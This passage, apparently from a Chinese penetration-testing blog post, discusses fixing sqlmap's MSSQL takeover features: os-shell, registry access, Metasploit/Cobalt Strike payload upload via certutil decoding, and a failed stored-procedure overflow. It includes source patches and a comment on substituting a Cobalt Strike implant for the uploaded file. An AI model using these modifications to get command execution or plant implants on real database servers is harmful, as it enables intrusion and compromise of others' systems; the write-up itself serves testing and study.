+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件/sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py 393行左右，读文件</span></span><br><span class="line"><span class="comment"># 将localFile替换成CS的exe马，即可，我这里是默认的，没有指定x64,指定了x64不上线。。</span></span><br><span class="line">	      <span class="comment"># localFile = &quot;/Users/lnx/Desktop/test.exe&quot;</span></span><br><span class="line">        <span class="keyword">with</span> open(localFile, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            localFileContent = f.read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/6e52a8fb/021.png" alt="image-20200430154114803"></p>
+<p>这里思路已经给出，可以直接修改sqlmap代码，将payload改成上传powershell或则其他类型payload,以以适用于高版本的操作系统。</p>
+<h3 id="存储过程缓冲区溢出反思"><a href="#存储过程缓冲区溢出反思" class="headerlink" title="存储过程缓冲区溢出反思"></a>存储过程缓冲区溢出反思</h3><p>参数：-<code>-os-bof</code></p>
+<p>只针对03 的，不过我这里一次都没成功。<code>/sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/takeover.py</code>文件中可以看到具体的代码。</p>
+<ul>
+<li>首先调用msfvenom生成Raw格式payload然后<code>/Users/lnx/Desktop/1.4.4/libexec/lib/takeover/metasploit.py</code>再617行，以<code>rb</code>读取得到<code>shellcodestring</code>。</li>
+<li>再经过<code>/Users/lnx/Desktop/1.4.4/libexec/plugins/dbms./mssqlserver/takeover.py</code>70行前后代码处理得到最终的代码。。。然后发送带有Payload的HTTP请求。。。(这里不附录payload,太长了，可以去改文件输出，看一下。)</li>
+</ul>
+<p>这里复制最终的代码，直接在数据库中执行，发现服务器堆栈溢出。。。。。没有接受到反弹。。</p>
+<p><img src="/posts/6e52a8fb/022.png" alt="image-20200429163323085"></p>
+<p>因为菜，暂未找到好办法。。。</p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>经过以上测试，还是有点收获的，毕竟能够执行命令了，而且知道了sqlmap无法通过MSSQL执行的原因以及修复方式。</p>
+<h3 id="命令执行–os-shell"><a href="#命令执行–os-shell" class="headerlink" title="命令执行–os-shell"></a>命令执行–os-shell</h3><p><strong>成因：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一个问题：sqlmap创建的表填充字段时，字段内容不允许为空。</span><br><span class="line">第二个问题：多语句查询时，返回两条结果，而第二条结果包含两个字段内容。</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复：</strong></p>
+<p>修改所有关于MSSQL创建表时字段属性，添加<code>NULL</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/generic/misc.py    124行，创建表时字段名后加一个NULL</span></span><br><span class="line"><span class="comment"># 如下：</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createSupportTbl</span>(<span class="params">self, tblName, tblField, tblType</span>):</span></span><br><span class="line">        inject.goStacked(<span class="string">&quot;DROP TABLE %s&quot;</span> % tblName, silent=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Backend.isDbms(DBMS.MSSQL) <span class="keyword">and</span> tblName == self.cmdTblName:</span><br><span class="line">            inject.goStacked(<span class="string">&quot;CREATE TABLE %s(id INT PRIMARY KEY IDENTITY, %s %s NULL)&quot;</span> % (tblName, tblField, tblType))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            inject.goStacked(<span class="string">&quot;CREATE TABLE %s(%s %s)&quot;</span> % (tblName, tblField, tblType))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py  96行</span></span><br><span class="line">self.createSupportTbl(txtTbl, self.tblField, <span class="string">&quot;text&quot;</span>)</span><br><span class="line">        inject.goStacked(<span class="string">&quot;DROP TABLE %s&quot;</span> % hexTbl)</span><br><span class="line">        inject.goStacked(<span class="string">&quot;CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s NULL)&quot;</span> % (hexTbl, self.tblField, <span class="string">&quot;VARCHAR(4096)&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="注册表-–reg"><a href="#注册表-–reg" class="headerlink" title="注册表 –reg-[]"></a>注册表 –reg-[]</h3><p><strong>成因：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap无法读取注册表是因为路径中包含空格，导致参数被截断。</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改上传路径：</span></span><br><span class="line"><span class="comment">#	全局搜索字符串：.bat</span></span><br><span class="line"><span class="comment">#	/sqlmap/1.4.4/libexec/lib/takeover/registry.py   27行 注释掉原本语句，改为如下</span></span><br><span class="line">        self._randStr = randomStr(lowercase=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># self._batPathRemote = &quot;\&quot;%s/tmpr%s.bat\&quot;&quot; % (conf.tmpPath, self._randStr)</span></span><br><span class="line">        self._batPathRemote = <span class="string">&quot;%s/tmpr%s.bat&quot;</span> % (<span class="string">&quot;C:/Windows&quot;</span>, self._randStr)</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF-amp-CS联动"><a href="#MSF-amp-CS联动" class="headerlink" title="MSF&amp;CS联动"></a>MSF&amp;CS联动</h3><p><strong>成因：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload成功上传，但是解码时候，路径出现空格截断，导致命令错误。</span><br></pre></td></tr></table></figure>
+
+<p><strong>修复：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /sqlmap/1.4.4/libexec/plugins/dbms./mssqlserver/filesystem.py   376行，添加双引号</span></span><br><span class="line">       commands = ( </span><br><span class="line">            <span class="string">&quot;cd \&quot;%s\&quot;&quot;</span> % tmpPath,</span><br><span class="line">            <span class="string">&quot;certutil -f -decode %s \&quot;%s\&quot;&quot;</span> % (randFile, remoteFile),</span><br><span class="line">            <span class="string">&quot;del /F /Q %s&quot;</span> % randFile</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>oudeniu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://butnomingzi.github.io/posts/6e52a8fb/" title="sqlmap关于MSSQL执行命令思考">https://butnomingzi.github.io/posts/6e52a8fb/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+              <a href="/tags/MSSQL/" rel="tag"><i class="fa fa-tag"></i> MSSQL</a>
+              <a href="/tags/SQLMap/" rel="tag"><i class="fa fa-tag"></i> SQLMap</a>
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/8949441d/" rel="prev" title="常用Proxy小结">
+      <i class="fa fa-chevron-left"></i> 常用Proxy小结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/bb8356a5/" rel="next" title="Oracle小结">
+      Oracle小结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E7%8E%AF%E5%A2%83%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x00 环境概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%B5%8B%E8%AF%95sqlmap%E5%91%BD%E4%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">0x01 测试sqlmap命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%93os-shell"><span class="nav-number">2.1.</span> <span class="nav-text">–os-shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%93sql-shell"><span class="nav-number">2.2.</span> <span class="nav-text">–sql-shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%93os-pwn"><span class="nav-number">2.3.</span> <span class="nav-text">–os-pwn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%93os-smbrelay"><span class="nav-number">2.4.</span> <span class="nav-text">–os-smbrelay</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%93os-bof"><span class="nav-number">2.5.</span> <span class="nav-text">–os-bof</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%93reg-read-add-del"><span class="nav-number">2.6.</span> <span class="nav-text">–reg-[read&#x2F;add&#x2F;del]</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%8F%8D%E6%80%9D"><span class="nav-number">3.</span> <span class="nav-text">0x02 反思</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8F%8D%E6%80%9D"><span class="nav-number">3.1.</span> <span class="nav-text">命令执行反思</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C%E5%8F%8D%E6%80%9D"><span class="nav-number">3.2.</span> <span class="nav-text">注册表操作反思</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%8A%A8MSF%E5%8F%8D%E6%80%9D"><span class="nav-number">3.3.</span> <span class="nav-text">联动MSF反思</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8F%8D%E6%80%9D"><span class="nav-number">3.4.</span> <span class="nav-text">存储过程缓冲区溢出反思</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">0x03 总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E2%80%93os-shell"><span class="nav-number">4.1.</span> <span class="nav-text">命令执行–os-shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8-%E2%80%93reg"><span class="nav-number">4.2.</span> <span class="nav-text">注册表 –reg-[]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF-amp-CS%E8%81%94%E5%8A%A8"><span class="nav-number">4.3.</span> <span class="nav-text">MSF&amp;CS联动</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">oudeniu</p>
+  <div class="site-description" itemprop="description">一点都对，半点都没错。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy8=" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;potatsoSec&#x2F;">宽字节安全</span>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=420 src="//music.163.com/outchain/player?type=0&id=5008808022&auto=1&height=430"></iframe>
+      </div>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">oudeniu</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">202k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:04</span>
+</div>
+    <!-- 网站运行时间的设置 -->
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>  
+    <script>
+        var now = new Date();
+        function createtime() {
+            var grt= new Date("03/03/2020 13:14:21");//此处修改你的建站时间或者网站上线时间
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+            document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+            document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        }
+    setInterval("createtime()",250);
+    </script>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-firestore.js"></script>
+  <script>
+    firebase.initializeApp({
+      apiKey   : '',
+      projectId: ''
+    });
+
+    function getCount(doc, increaseCount) {
+      // IncreaseCount will be false when not in article page
+      return doc.get().then(d => {
+        var count = 0;
+        if (!d.exists) { // Has no data, initialize count
+          if (increaseCount) {
+            doc.set({
+              count: 1
+            });
+            count = 1;
+          }
+        } else { // Has data
+          count = d.data().count;
+          if (increaseCount) {
+            // If first view this article
+            doc.set({ // Increase count
+              count: count + 1
+            });
+            count++;
+          }
+        }
+
+        return count;
+      });
+    }
+
+    function appendCountTo(el) {
+      return count => {
+        el.innerText = count;
+      }
+    }
+  </script>
+  <script data-pjax>
+    (function() {
+      var db = firebase.firestore();
+      var articles = db.collection('articles');
+
+      if (CONFIG.page.isPost) { // Is article page
+        var title = document.querySelector('.post-title').innerText.trim();
+        var doc = articles.doc(title);
+        var increaseCount = CONFIG.hostname === location.hostname;
+        if (localStorage.getItem(title)) {
+          increaseCount = false;
+        } else {
+          // Mark as visited
+          localStorage.setItem(title, true);
+        }
+        getCount(doc, increaseCount).then(appendCountTo(document.querySelector('.firestore-visitors-count')));
+      } else if (CONFIG.page.isHome) { // Is index page
+        var promises = [...document.querySelectorAll('.post-title')].map(element => {
+          var title = element.innerText.trim();
+          var doc = articles.doc(title);
+          return getCount(doc);
+        });
+        Promise.all(promises).then(counts => {
+          var metas = document.querySelectorAll('.firestore-visitors-count');
+          counts.forEach((val, idx) => {
+            appendCountTo(metas[idx])(val);
+          });
+        });
+      }
+    })();
+  </script>
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"}});</script></body>
+</html>
